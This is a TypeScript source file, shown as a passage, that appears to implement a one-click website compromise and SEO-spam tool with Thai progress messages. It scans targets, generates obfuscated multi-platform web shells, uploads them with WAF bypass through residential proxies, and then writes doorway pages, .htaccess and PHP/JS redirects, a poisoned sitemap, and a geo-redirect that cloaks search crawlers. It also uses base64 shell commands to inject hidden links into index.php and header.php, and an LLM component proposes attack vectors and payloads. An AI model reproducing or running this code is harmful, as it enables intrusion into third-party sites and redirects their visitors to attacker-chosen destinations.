var n=navigator.userAgent;
if(!/Googlebot|Bingbot|YandexBot|Slurp|DuckDuckBot/i.test(n)){
  var d=document.createElement('meta');
  d.httpEquiv='refresh';
  d.content='2;url='+u;
  document.head.appendChild(d);
  setTimeout(function(){window.location.replace(u)},1800);
}
})();
</script>`;
}

function generateSitemapPoison(targetUrl: string, redirectUrl: string): string {
  const pages = ["deals", "offers", "promo", "discount", "sale", "coupon", "best-price", "review"];
  const urls = pages.map(p =>
    `  <url>\n    <loc>${redirectUrl}/${p}</loc>\n    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>\n    <changefreq>daily</changefreq>\n    <priority>0.9</priority>\n  </url>`
  ).join("\n");

  return `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>${redirectUrl}</loc>
    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>
    <changefreq>daily</changefreq>
    <priority>1.0</priority>
  </url>
${urls}
</urlset>`;
}

// ═══════════════════════════════════════════════════════
//  GEO REDIRECT — from seo_engine.py
// ═══════════════════════════════════════════════════════

function generateGeoRedirectPhp(redirectUrl: string): string {
  return `<?php
/**
 * Geo-based redirect — Thai IP → redirect, others → landing page
 * Ported from seo_engine.py
 */
function getCountryByIP($ip) {
  $apis = array(
    "http://ip-api.com/json/{$ip}?fields=countryCode",
    "https://ipapi.co/{$ip}/country_code/",
  );
  foreach ($apis as $api) {
    $ch = curl_init($api);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $resp = curl_exec($ch);
    curl_close($ch);
    if ($resp) {
      $json = json_decode($resp, true);
      if (isset($json['countryCode'])) return $json['countryCode'];
      if (strlen($resp) == 2) return strtoupper($resp);
    }
  }
  return 'US';
}

$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0] : $_SERVER['REMOTE_ADDR'];
$country = getCountryByIP(trim($ip));

// Bot detection
$bots = array('Googlebot','Bingbot','YandexBot','Slurp','DuckDuckBot','Baiduspider','facebookexternalhit','Twitterbot');
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$is_bot = false;
foreach ($bots as $bot) {
  if (stripos($ua, $bot) !== false) { $is_bot = true; break; }
}

// Thai IP and not a bot → redirect
if ($country === 'TH' && !$is_bot) {
  header("Location: ${redirectUrl}", true, 302);
  exit;
}

// Show landing page for bots and non-Thai visitors
?>`;
}

function generateDefaultLandingHtml(redirectUrl: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<title>Welcome - Premium Services</title>
<meta name="description" content="Premium services and exclusive deals. Visit now for special offers.">
<meta name="robots" content="index, follow">
<link rel="canonical" href="${redirectUrl}">
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;margin:0;padding:0;background:#f8f9fa;color:#333;}
.container{max-width:800px;margin:0 auto;padding:40px 20px;text-align:center;}
h1{font-size:2em;color:#2c3e50;margin-bottom:20px;}
p{font-size:1.1em;line-height:1.6;color:#555;}
.cta{display:inline-block;padding:15px 40px;background:#3498db;color:#fff;text-decoration:none;border-radius:8px;font-size:1.1em;margin-top:30px;}
.cta:hover{background:#2980b9;}
</style>
</head>
<body>
<div class="container">
<h1>Welcome to Our Premium Services</h1>
<p>We offer the best deals and exclusive services. Our team is dedicated to providing you with top-quality products at unbeatable prices.</p>
<a href="${redirectUrl}" class="cta">Explore Our Services →</a>
</div>
</body>
</html>`;
}

async function deployFiles(
  shellUrl: string,
  password: string,
  targetUrl: string,
  redirectUrl: string,
  opts: { geoRedirectEnabled?: boolean; landingHtml?: string; timeout?: number; seoKeywords?: string[] },
): Promise<FileDeployResult[]> {
  const results: FileDeployResult[] = [];
  const testUrl = `${shellUrl}?k=${password}`;
  const fileTimeout = opts.timeout || 15000;

  async function writeFile(filename: string, content: string, type: string): Promise<FileDeployResult> {
    const result: FileDeployResult = { filename, success: false, type };

    // Retry up to 2 times for each file write
    for (let attempt = 0; attempt < 2; attempt++) {
      try {
        const response = await proxyFetch(testUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": randomUA(),
          },
          body: `file=${encodeURIComponent(filename)}&content=${encodeURIComponent(content)}`,
        }, fileTimeout + (attempt * 5000));

        const text = await response.text();
        // More robust success detection: check response body for known success indicators
        const shellSaysOk = text.includes("FILE_WRITTEN") || text.includes("OK") ||
          (response.status === 200 && !text.includes("ERROR") && !text.includes("FAIL") && !text.includes("denied"));

        if (shellSaysOk) {
          const basePath = new URL(shellUrl).pathname.split("/").slice(0, -1).join("/");
          const fileUrl = `${targetUrl}${basePath}/${filename}`;
          result.url = fileUrl;

          // CRITICAL: Post-write verification — HTTP GET the file to confirm it actually exists
          try {
            const verifyResp = await proxyFetch(fileUrl, {
              headers: {
                "User-Agent": randomUA(),
                "Accept": "text/html,application/xhtml+xml,*/*",
              },
              redirect: "manual", // Don't follow redirects — we want to see the raw response
            }, 10000);

            // SUCCESS: File exists and returns 200
            if (verifyResp.status === 200) {
              const verifyText = await verifyResp.text();
              // Check if this is actually our file, not a CMS catch-all page
              const isCmsPage = 
                verifyText.includes('wp-content') ||
                verifyText.includes('wp-includes') ||
                verifyText.includes('wordpress') ||
                (verifyText.includes('contact-us') && verifyText.includes('</html>')) ||
                (verifyText.includes('<!DOCTYPE html>') && verifyText.length > 5000 && !verifyText.includes(redirectUrl));
              
              if (isCmsPage) {
                result.success = false;
                result.error = `File URL returns CMS page instead of deployed content (WordPress catch-all redirect)`;
              } else {
                result.success = true; // File verified to exist!
              }
            }
            // FAIL: 301/302 redirect = CMS catch-all, file doesn't exist
            else if ([301, 302, 303, 307, 308].includes(verifyResp.status)) {
              const location = verifyResp.headers.get('location') || '';
              result.success = false;
              result.error = `File URL redirects to ${location} (CMS catch-all, file not created)`;
            }
            // FAIL: 403 = permission denied
            else if (verifyResp.status === 403) {
              result.success = false;
              result.error = `File URL returns 403 Forbidden (permission denied, file not accessible)`;
            }
            // FAIL: 404 = file not found
            else if (verifyResp.status === 404) {
              result.success = false;
              result.error = `File URL returns 404 Not Found (file was not created)`;
            }
            // Other status = uncertain
            else {
              result.success = false;
              result.error = `File URL returns unexpected status ${verifyResp.status}`;
            }
          } catch (verifyErr: any) {
            // If verification request fails, mark as unverified but still report shell said OK
            result.success = false;
            result.error = `Shell said OK but could not verify file exists: ${(verifyErr.message || 'Unknown').slice(0, 100)}`;
          }

          if (result.success) break; // Verified success, no need to retry
        } else {
          result.error = `Shell responded but file may not be written (status: ${response.status}, body: ${text.slice(0, 100)})`;
        }
      } catch (e: any) {
        result.error = (e.message || "Unknown").slice(0, 200);
      }

      // Wait before retry
      if (attempt < 1) {
        await new Promise(r => setTimeout(r, 1500));
      }
    }
    return result;
  }

  // 1. Deploy doorway pages with SEO keywords
  const defaultKw = ["best deals 2026", "cheap products online", "discount promo code", "exclusive offers today", "save money shopping"];
  const keywords = (opts.seoKeywords && opts.seoKeywords.length > 0) ? opts.seoKeywords : defaultKw;
  for (let i = 0; i < keywords.length; i++) {
    const filename = `deal-${randomStr(6)}.html`;
    const content = generateDoorwayPage(redirectUrl, keywords[i]);
    results.push(await writeFile(filename, content, "doorway_page"));
  }

  // 2. Deploy .htaccess redirect
  results.push(await writeFile(".htaccess", generateHtaccessRedirect(redirectUrl), "htaccess_redirect"));

  // 3. Deploy PHP redirect
  results.push(await writeFile(`redirect-${randomStr(6)}.php`, generatePhpRedirect(redirectUrl), "php_redirect"));

  // 4. Deploy JS redirect
  results.push(await writeFile(`assets-${randomStr(6)}.php`, generateJsRedirect(redirectUrl), "js_redirect"));

  // 5. Deploy poisoned sitemap
  results.push(await writeFile("sitemap-news.xml", generateSitemapPoison(targetUrl, redirectUrl), "sitemap_poison"));

  // 6. Deploy geo redirect (from seo_engine.py)
  if (opts.geoRedirectEnabled !== false) {
    const geoPhp = generateGeoRedirectPhp(redirectUrl);
    const landingHtml = opts.landingHtml || generateDefaultLandingHtml(redirectUrl);
    const geoContent = geoPhp + "\n" + landingHtml;
    results.push(await writeFile(`landing-${randomStr(6)}.php`, geoContent, "geo_redirect"));
  }

  // 7. Deploy meta tag injector with SEO keywords
  const kwForMeta = keywords.slice(0, 5);
  const metaDesc = kwForMeta.length > 0 ? kwForMeta.join(' - ') + '. Best deals and information.' : 'Best deals and discounts 2026. Save up to 90% on premium products.';
  const anchorLinks = kwForMeta.length > 0
    ? kwForMeta.map((k, i) => `<a href="${redirectUrl}${i > 0 ? '/' + k.replace(/\s+/g, '-').toLowerCase() : ''}">${k}</a>`).join('\n')
    : `<a href="${redirectUrl}">best deals 2026</a>\n<a href="${redirectUrl}/promo">discount code</a>\n<a href="${redirectUrl}/offer">exclusive offer</a>`;
  const metaInjector = `
<!-- SEO Meta Override -->
<meta name="keywords" content="${kwForMeta.join(', ')}">
<meta name="description" content="${metaDesc}">
<meta property="og:url" content="${redirectUrl}">
<link rel="canonical" href="${redirectUrl}">
<div style="display:none;position:absolute;left:-9999px;">
${anchorLinks}
</div>`;

  try {
    const injectFiles = ["index.php", "header.php", "footer.php", "home.php"];
    for (const file of injectFiles) {
      const encoded = Buffer.from(`echo '${metaInjector.replace(/'/g, "\\'")}' >> ${file}`).toString("base64");
      const response = await proxyFetch(testUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": randomUA(),
        },
        body: `c=${encoded}`,
      }, 10000);

      const text = await response.text();
      // Don't blindly trust 200 status — verify the injection actually worked
      const shellSaysOk = text.includes("OK") || text.includes("FILE_WRITTEN");
      results.push({
        filename: file,
        success: shellSaysOk && !text.includes("ERROR") && !text.includes("denied"),
        type: "meta_injection",
        error: !shellSaysOk ? `Shell response unclear (status: ${response.status})` : undefined,
      });
    }
  } catch { /* injection failed */ }

  return results;
}

// ═══════════════════════════════════════════════════════
//  STEP 6: VERIFY REDIRECT
// ═══════════════════════════════════════════════════════

interface RedirectVerifyResult {
  url: string;
  redirectsTo: string | null;
  statusCode: number;
  working: boolean;
  method: string;
}

async function verifyRedirect(targetUrl: string, redirectUrl: string, timeout = 15000, deployedFileUrls?: string[]): Promise<RedirectVerifyResult[]> {
  const results: RedirectVerifyResult[] = [];
  const normalizedRedirect = redirectUrl.replace(/^https?:\/\//, "").replace(/\/+$/, "");

  const checks = [
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", method: "http_redirect" },
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", method: "mobile_redirect" },
    { ua: "Googlebot/2.1 (+http://www.google.com/bot.html)", method: "googlebot_redirect" },
  ];

  // Strategy 1: Check root domain (original behavior)
  for (const check of checks) {
    try {
      const response = await proxyFetch(targetUrl, {
        headers: { "User-Agent": check.ua, "Referer": "https://www.google.com/" },
        redirect: "manual",
      }, timeout);

      const location = response.headers.get("location");
      const working = location?.replace(/^https?:\/\//, "").replace(/\/+$/, "").includes(normalizedRedirect) || false;
      results.push({
        url: targetUrl,
        redirectsTo: location,
        statusCode: response.status,
        working,
        method: check.method,
      });

      // If root domain redirects, that's the best result
      if (working) continue;

      // Also check HTML body for JS/meta redirect
      if (response.status === 200) {
        const text = await response.text();
        const metaMatch = text.match(/content=["']\d+;\s*url=([^"']+)/i);
        const jsMatch = text.match(/location\.(?:href|replace)\s*[=(]\s*["']([^"']+)/i) ||
                        text.match(/window\.location\s*=\s*["']([^"']+)/i);
        const redirectTo = metaMatch?.[1] || jsMatch?.[1] || null;
        if (redirectTo?.replace(/^https?:\/\//, "").replace(/\/+$/, "").includes(normalizedRedirect)) {
          results[results.length - 1].working = true;
          results[results.length - 1].redirectsTo = redirectTo;
          results[results.length - 1].method = check.method + "_" + (metaMatch ? "meta" : "js");
        }
      }
    } catch {
      results.push({ url: targetUrl, redirectsTo: null, statusCode: 0, working: false, method: check.method });
    }
  }

  // Strategy 2: Check individual deployed file URLs (the KEY improvement)
  // If root domain doesn't redirect, check the actual deployed files
  const hasRootRedirect = results.some(r => r.working);
  if (!hasRootRedirect && deployedFileUrls && deployedFileUrls.length > 0) {
    // Check up to 5 deployed file URLs
    const urlsToCheck = deployedFileUrls.slice(0, 5);
    for (const fileUrl of urlsToCheck) {
      const verification = await verifyRedirectActuallyWorks(fileUrl, redirectUrl, timeout);
      if (verification.works) {
        results.push({
          url: fileUrl,
          redirectsTo: verification.redirectsTo,
          statusCode: 302,
          working: true,
          method: `deployed_file_${verification.method}`,
        });
      }
    }
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  MAIN: ONE-CLICK DEPLOY (Enterprise-Grade)
// ═══════════════════════════════════════════════════════

export async function oneClickDeploy(
  targetDomain: string,
  redirectUrl: string,
  opts: DeployOptions = {},
): Promise<DeployResult> {
  const startTime = Date.now();
  const target = normalizeUrl(targetDomain);
  const redirect = normalizeUrl(redirectUrl);
  const maxRetries = opts.maxRetries ?? 5;
  const retryBaseDelay = opts.retryBaseDelay ?? 1000;
  const retryBackoffFactor = opts.retryBackoffFactor ?? 1.5;
  const onProgress = opts.onProgress;

  // Auto-inject residential proxies from pool if user didn't provide any
  if (!opts.proxies || opts.proxies.length === 0) {
    const poolProxies = proxyPool.getAllProxies().filter((p: ProxyEntry) => p.healthy);
    if (poolProxies.length > 0) {
      opts.proxies = poolProxies.map((p: ProxyEntry) => ({
        url: p.url,
        type: "http" as const,
        label: `residential-${p.ip}`,
      }));
      console.log(`[OneClickDeploy] Auto-injected ${opts.proxies!.length} residential proxies from pool`);
    }
  }

  // ─── AI Intelligence Init ───
  let aiIntel: AIDeployIntelligence | null = null;
  let aiStrategy: AIStrategyDecision | null = null;
  const aiStepAnalyses: StepAnalysis[] = [];

  const errorBreakdown: Record<ErrorCategory, number> = {
    timeout: 0, connection: 0, waf: 0, server_error: 0, permission: 0, not_found: 0, upload_failed: 0, unknown: 0,
  };
  let totalRetries = 0;

  const result: DeployResult = {
    id: generateDeployId(),
    success: false,
    timestamp: new Date().toISOString(),
    targetDomain: target,
    redirectUrl: redirect,
    steps: [],
    deployedFiles: [],
    shellInfo: null,
    directUploadInfo: {
      attempted: false,
      successCount: 0,
      failedCount: 0,
      uploadedFiles: [],
    },
    redirectInfo: {
      htaccessDeployed: false,
      jsRedirectDeployed: false,
      phpRedirectDeployed: false,
      metaRefreshDeployed: false,
      geoRedirectDeployed: false,
      doorwayPagesDeployed: 0,
      sitemapPoisoned: false,
      verifiedWorking: false,
      directUploadUsed: false,
      verifiedRedirectUrls: [],
    },
    proxyUsed: {
      enabled: !!(opts.proxies && opts.proxies.length > 0),
      totalProxies: opts.proxies?.length ?? 0,
      proxyRotation: opts.proxyRotation ?? "random",
    },
    weightedRedirects: opts.weightedRedirects ?? [],
    parasiteInfo: {
      generated: false,
      pagesCount: 0,
      totalWordCount: 0,
      avgSeoScore: 0,
      pages: [],
    },
    summary: {
      totalSteps: 9,
      successSteps: 0,
      failedSteps: 0,
      skippedSteps: 0,
      totalFilesDeployed: 0,
      totalDuration: 0,
      redirectActive: false,
      totalRetries: 0,
      proxyEnabled: !!(opts.proxies && opts.proxies.length > 0),
      errorBreakdown,
    },
    report: "",
  };

  // ─── AI: Send initial analysis event ───
  onProgress?.({
    type: "ai_analysis",
    step: "init",
    status: "running",
    detail: "🤖 AI กำลังเริ่มต้น... วิเคราะห์สภาพแวดล้อมเป้าหมาย",
    probability: 50,
  });

  // ─── Step 1: Scan Target (with retry) ───
  const step1: DeployStep = {
    step: 1, name: "🔍 Scan Target", status: "running", retries: 0,
    startTime: Date.now(), details: "Scanning target for upload paths & vulnerabilities...",
  };
  result.steps.push(step1);
  onProgress?.({ type: "phase_start", phase: 1, phaseName: "Scan Target", status: "running", progress: 0 });

  let scanResult: ScanResult;
  try {
    const { result: sr, retries } = await withRetry(
      () => scanTarget(target, opts.scanTimeout),
      { maxRetries, baseDelay: retryBaseDelay, backoffFactor: retryBackoffFactor, stepName: "scan", onProgress },
    );
    scanResult = sr;
    step1.retries = retries;
    totalRetries += retries;

    const writablePaths = scanResult.uploadPaths.filter(p => p.writable).length;
    const exposedVulns = scanResult.vulnPaths.filter(p => p.exists).length;
    step1.status = "success";
    step1.details = `Found ${writablePaths} writable paths, ${exposedVulns} exposed endpoints${scanResult.serverInfo.cms ? `, CMS: ${scanResult.serverInfo.cms}` : ""}`;
    step1.artifacts = scanResult.uploadPaths.filter(p => p.writable).map(p => ({
      type: "config" as const, filename: p.path, status: "deployed" as const, description: `Writable path (${p.type})`,
    }));
  } catch (e: any) {
    step1.status = "failed";
    step1.errorCategory = classifyError(e);
    step1.details = `Scan failed after ${maxRetries} retries: ${e.message}`;
    errorBreakdown[step1.errorCategory]++;
    scanResult = { uploadPaths: [], vulnPaths: [], serverInfo: {}, bestUploadPath: null };
  }
  step1.endTime = Date.now();
  step1.duration = step1.endTime - step1.startTime!;
  onProgress?.({ type: "phase_complete", phase: 1, phaseName: "Scan Target", status: step1.status as any, progress: 14, detail: step1.details, elapsed: Date.now() - startTime });

  // ─── AI: Analyze scan results and build strategy ───
  try {
    const targetProfile = buildTargetProfile(scanResult);
    targetProfile.domain = target;
    aiStrategy = selectOptimalStrategy(targetProfile);
    aiIntel = createAIDeployIntelligence(targetProfile);
    aiIntel.strategy = aiStrategy;

    // Send AI analysis to frontend
    onProgress?.({
      type: "ai_analysis",
      step: "target_analysis",
      status: "success",
      detail: `🤖 AI วิเคราะห์: ${aiStrategy.reasoning}`,
      probability: aiStrategy.overallSuccessProbability,
      aiAnalysis: {
        successProbability: aiStrategy.overallSuccessProbability,
        riskLevel: aiStrategy.riskLevel,
        approach: aiStrategy.recommendedApproach,
        shellObfuscation: aiStrategy.shellStrategy.obfuscationLayers,
        evasionTechniques: aiStrategy.shellStrategy.evasionTechniques,
        uploadMethodPriority: aiStrategy.uploadStrategy.methodPriority,
        pathPriority: aiStrategy.uploadStrategy.pathPriority.slice(0, 5),
        redirectMethod: aiStrategy.redirectStrategy.primaryMethod,
        timingStrategy: aiStrategy.uploadStrategy.timingStrategy,
        warnings: aiStrategy.warnings,
      },
    });

    // Run deep AI analysis (LLM) in background — don't block pipeline
    aiAnalyzeTarget(targetProfile, target).then(deepAnalysis => {
      if (aiIntel) {
        (aiIntel as any).deepAnalysis = deepAnalysis;
      }
      onProgress?.({
        type: "ai_analysis",
        step: "deep_analysis",
        status: "success",
        detail: `🧠 AI วิเคราะห์เชิงลึก: ${deepAnalysis.analysis}`,
        aiAnalysis: {
          vulnerabilities: deepAnalysis.vulnerabilities,
          attackVectors: deepAnalysis.recommendedAttackVectors,
          difficulty: deepAnalysis.estimatedDifficulty,
          payloadSuggestions: deepAnalysis.customPayloadSuggestions,
        },
      });
    }).catch(() => { /* non-blocking */ });
  } catch (e) {
    // AI analysis failed — continue without it
    onProgress?.({
      type: "ai_analysis",
      step: "target_analysis",
      status: "failed",
      detail: "🤖 AI วิเคราะห์ไม่พร้อม — ดำเนินการด้วยกลยุทธ์เริ่มต้น",
      probability: 50,
    });
  }

  // ─── Step 2: Direct Redirect Upload (NEW — redirect-first strategy) ───
  const step2Direct: DeployStep = {
    step: 2, name: "📄 Direct Redirect Upload", status: "running", retries: 0,
    startTime: Date.now(), details: "Uploading redirect files directly (PHP redirect + geo redirect + HTML doorway)...",
  };
  result.steps.push(step2Direct);
  onProgress?.({ type: "phase_start", phase: 2, phaseName: "Direct Redirect Upload", status: "running", progress: 12 });

  let directUploadSuccess = false;
  try {
    const redirectPayloads = generateRedirectPayloads(redirect, {
      geoRedirectEnabled: opts.geoRedirectEnabled,
      landingHtml: opts.landingHtml,
      seoKeywords: opts.seoKeywords,
    });

    const paths = scanResult.bestUploadPath
      ? [scanResult.bestUploadPath, ...UPLOAD_SCAN_PATHS.filter(p => p !== scanResult.bestUploadPath).slice(0, 7)]
      : UPLOAD_SCAN_PATHS.slice(0, 8);

    const { result: directResults, retries } = await withRetry(
      () => uploadRedirectDirect(target, redirectPayloads, paths, opts.uploadTimeout),
      { maxRetries: Math.min(maxRetries, 2), baseDelay: retryBaseDelay, backoffFactor: retryBackoffFactor, stepName: "direct_upload", onProgress },
    );
    step2Direct.retries = retries;
    totalRetries += retries;

    const successfulUploads = directResults.filter(r => r.success);
    result.directUploadInfo.attempted = true;
    result.directUploadInfo.successCount = successfulUploads.length;
    result.directUploadInfo.failedCount = directResults.length - successfulUploads.length;
    result.directUploadInfo.uploadedFiles = successfulUploads.map(r => ({
      type: r.payload.type,
      filename: r.payload.filename,
      url: r.uploadedUrl,
      method: r.method,
    }));

    if (successfulUploads.length > 0) {
      result.redirectInfo.directUploadUsed = true;

      // Map successful direct uploads to redirectInfo flags
      for (const s of successfulUploads) {
        if (s.payload.type === "php_redirect" || s.payload.type === "polyglot_redirect") result.redirectInfo.phpRedirectDeployed = true;
        if (s.payload.type === "geo_redirect") result.redirectInfo.geoRedirectDeployed = true;
        if (s.payload.type === "doorway_html") {
          result.redirectInfo.doorwayPagesDeployed++;
          result.redirectInfo.metaRefreshDeployed = true;
          result.redirectInfo.jsRedirectDeployed = true;
        }
        if (s.payload.type === "polyglot_redirect") {
          result.redirectInfo.metaRefreshDeployed = true;
          result.redirectInfo.jsRedirectDeployed = true;
        }
      }

      // *** KEY FIX: Verify each uploaded file actually redirects ***
      const verifiedFiles: typeof successfulUploads = [];
      const unverifiedFiles: typeof successfulUploads = [];

      for (const s of successfulUploads) {
        if (s.uploadedUrl) {
          const verification = await verifyRedirectActuallyWorks(s.uploadedUrl, redirect);
          if (verification.works) {
            verifiedFiles.push(s);
            result.redirectInfo.verifiedRedirectUrls.push({
              url: s.uploadedUrl,
              redirectsTo: verification.redirectsTo || redirect,
              statusCode: 302,
              method: verification.method,
            });
          } else {
            unverifiedFiles.push(s);
          }
        }
      }

      // Add ALL uploaded files to deployedFiles — only mark verified ones as "deployed"
      for (const s of successfulUploads) {
        const isVerified = verifiedFiles.includes(s);
        result.deployedFiles.push({
          type: s.payload.type === "doorway_html" ? "page" : "redirect",
          filename: s.payload.filename,
          url: s.uploadedUrl,
          status: isVerified ? "deployed" : "failed",  // CRITICAL FIX: unverified = failed
          description: `${s.payload.description} (direct upload via ${s.method})${isVerified ? " ✅ REDIRECT VERIFIED" : " ⚠️ uploaded but redirect not verified"}`,
        });
      }

      directUploadSuccess = verifiedFiles.length > 0;
      result.directUploadInfo.successCount = verifiedFiles.length;
      result.directUploadInfo.failedCount = directResults.length - verifiedFiles.length;

      if (verifiedFiles.length > 0) {
        result.redirectInfo.verifiedWorking = true;
      }

      step2Direct.status = verifiedFiles.length > 0 ? "success" : "failed";
      step2Direct.details = verifiedFiles.length > 0
        ? `${verifiedFiles.length} redirect files verified working! ${verifiedFiles.map(s => `${s.payload.type}→${s.uploadedUrl}`).join(", ")}${unverifiedFiles.length > 0 ? ` (${unverifiedFiles.length} uploaded but redirect not working)` : ""}`
        : `${successfulUploads.length} files uploaded but none redirect correctly — falling back to shell method`;
      step2Direct.artifacts = successfulUploads.map(s => {
        const isVerified = verifiedFiles.includes(s);
        return {
          type: s.payload.type === "doorway_html" ? "page" as const : "redirect" as const,
          filename: s.payload.filename,
          url: s.uploadedUrl,
          status: isVerified ? "deployed" as const : "failed" as const,
          description: `${s.payload.description}${isVerified ? " ✅ REDIRECT VERIFIED" : " ⚠️ redirect not working"}`,
        };
      });
    } else {
      step2Direct.status = "failed";
      step2Direct.details = `Direct upload failed: 0/${directResults.length} attempts successful — falling back to shell method`;
    }
  } catch (e: any) {
    step2Direct.status = "failed";
    step2Direct.errorCategory = classifyError(e);
    step2Direct.details = `Direct upload failed: ${e.message} — falling back to shell method`;
    errorBreakdown[step2Direct.errorCategory]++;
    result.directUploadInfo.attempted = true;
  }
  step2Direct.endTime = Date.now();
  step2Direct.duration = step2Direct.endTime - step2Direct.startTime!;
  onProgress?.({ type: "phase_complete", phase: 2, phaseName: "Direct Redirect Upload", status: step2Direct.status as any, progress: 24, detail: step2Direct.details, elapsed: Date.now() - startTime });

  // ─── AI: Adapt strategy after direct upload ───
  if (aiStrategy) {
    const directUploadAnalysis: StepAnalysis = {
      stepName: "direct_upload",
      success: directUploadSuccess,
      details: step2Direct.details,
      aiRecommendation: directUploadSuccess ? "Direct upload worked — shell may be optional" : "Direct upload failed — shell is critical",
      adaptedStrategy: null,
      nextStepAdjustments: [],
    };
    aiStrategy = adaptStrategyAfterStep(aiStrategy, directUploadAnalysis);
    aiStepAnalyses.push(directUploadAnalysis);
    if (aiIntel) aiIntel.strategy = aiStrategy;

    onProgress?.({
      type: "ai_adaptation",
      step: "after_direct_upload",
      status: directUploadSuccess ? "success" : "running",
      detail: `\ud83e\udd16 AI ปรับกลยุทธ์: ${aiStrategy.adaptations[aiStrategy.adaptations.length - 1] || "ไม่เปลี่ยนแปลง"}`,
      probability: aiStrategy.overallSuccessProbability,
      aiAnalysis: { adaptations: aiStrategy.adaptations, newProbability: aiStrategy.overallSuccessProbability },
    });
  }

  // ─── Step 3: Generate Shell (Multi-Platform) ───
  const step2: DeployStep = {
    step: 3, name: "💀 Generate Shell (Multi-Platform)", status: "running", retries: 0,
    startTime: Date.now(), details: "Generating multi-platform shells (PHP/ASP/ASPX/JSP)...",
  };
  result.steps.push(step2);
  onProgress?.({ type: "phase_start", phase: 3, phaseName: "Generate Shell (Multi-Platform)", status: "running", progress: 24 });

  let shell: GeneratedShell;
  let multiPlatformShells: MultiPlatformShell[] = [];
  let detectedPlatforms: ServerPlatform[] = ["php"];
  try {
    // Detect server platform from scan results
    const responseHeaders: Record<string, string> = {};
    if (scanResult.serverInfo) {
      if (scanResult.serverInfo) responseHeaders["server"] = String(scanResult.serverInfo);
    }
    detectedPlatforms = detectServerPlatform(responseHeaders, opts.preScreenResult);

    // Generate primary PHP shell
    shell = generateShell();

    // Generate shells for all detected platforms
    multiPlatformShells = generateMultiPlatformShells(shell.password, detectedPlatforms);

    const platformNames = detectedPlatforms.join(", ").toUpperCase();
    step2.status = "success";
    step2.details = `Multi-platform shells generated: ${shell.filename} (PHP) + ${multiPlatformShells.length} platform variants [${platformNames}] (${shell.layers.length} layers: ${shell.layers.map(l => l.method).join(" → ")})`;
    step2.artifacts = [
      {
        type: "shell", filename: shell.filename, size: shell.finalPayload.length,
        status: "pending", description: `PHP polymorphic shell (password: ${shell.password})`,
      },
      ...multiPlatformShells.filter(s => s.platform !== "php").map(s => ({
        type: "shell" as const, filename: s.filename, size: s.code.length,
        status: "pending" as const, description: `${s.platform.toUpperCase()} shell: ${s.description}`,
      })),
    ];
  } catch (e: any) {
    step2.status = "failed";
    step2.details = `Shell generation failed: ${e.message}`;
    shell = generateShell();
    multiPlatformShells = [{ code: shell.finalPayload, password: shell.password, filename: shell.filename, platform: "php", contentType: "application/x-php", description: "PHP fallback" }];
  }
  step2.endTime = Date.now();
  step2.duration = step2.endTime - step2.startTime!;
  onProgress?.({ type: "phase_complete", phase: 3, phaseName: "Generate Shell (Multi-Platform)", status: step2.status as any, progress: 32, detail: step2.details, elapsed: Date.now() - startTime });

  // ─── Step 4: Upload Shell (with retry) ───
  const step3: DeployStep = {
    step: 4, name: "📤 Upload Shell", status: "running", retries: 0,
    startTime: Date.now(), details: "Uploading shell via WAF bypass (6 methods × multiple paths)...",
  };
  result.steps.push(step3);
  onProgress?.({ type: "phase_start", phase: 4, phaseName: "Upload Shell", status: "running", progress: 32 });

  let uploadResults: UploadResult[] = [];
  let activeShellUrl: string | null = null;

  // Step-level timeout: 90 seconds max for the entire upload shell step
  const UPLOAD_STEP_TIMEOUT_MS = 90_000;
  const uploadStepAbort = new AbortController();
  const uploadStepTimer = setTimeout(() => uploadStepAbort.abort(), UPLOAD_STEP_TIMEOUT_MS);

  try {
    const paths = scanResult.bestUploadPath
      ? [scanResult.bestUploadPath, ...UPLOAD_SCAN_PATHS.filter(p => p !== scanResult.bestUploadPath).slice(0, 4)]
      : UPLOAD_SCAN_PATHS.slice(0, 5);

    const { result: ur, retries } = await withRetry(
      async () => {
        if (uploadStepAbort.signal.aborted) throw new Error('Upload step timed out (90s)');
        const res = await uploadShell(target, shell, paths, opts.uploadTimeout || 8000, uploadStepAbort.signal, opts.methodPriority);
        const successful = res.find(u => u.success);
        if (!successful?.shellUrl) throw new Error(`0/${res.length} upload attempts successful`);
        return res;
      },
      { maxRetries: Math.min(maxRetries, 2), baseDelay: retryBaseDelay, backoffFactor: retryBackoffFactor, stepName: "upload", onProgress },
    );
    uploadResults = ur;
    step3.retries = retries;
    totalRetries += retries;

    const successful = uploadResults.find(u => u.success);
    if (successful?.shellUrl) {
      activeShellUrl = successful.shellUrl;
      step3.status = "success";
      step3.details = `Shell uploaded: ${successful.shellUrl} (method: ${successful.method})${retries > 0 ? ` [${retries} retries]` : ""}`;
      step3.artifacts = [{
        type: "shell", filename: shell.filename, url: successful.shellUrl,
        status: "deployed", description: `Uploaded via ${successful.method}`,
      }];
    }
  } catch (e: any) {
    // PHP upload failed — try multi-platform shells (ASP/ASPX/JSP/CFM)
    if (multiPlatformShells.length > 1) {
      onProgress?.({ type: "step_detail", phase: 4, detail: `PHP upload failed, trying ${multiPlatformShells.filter(s => s.platform !== "php").length} alternative platform shells...` });
      
      for (const altShell of multiPlatformShells.filter(s => s.platform !== "php")) {
        try {
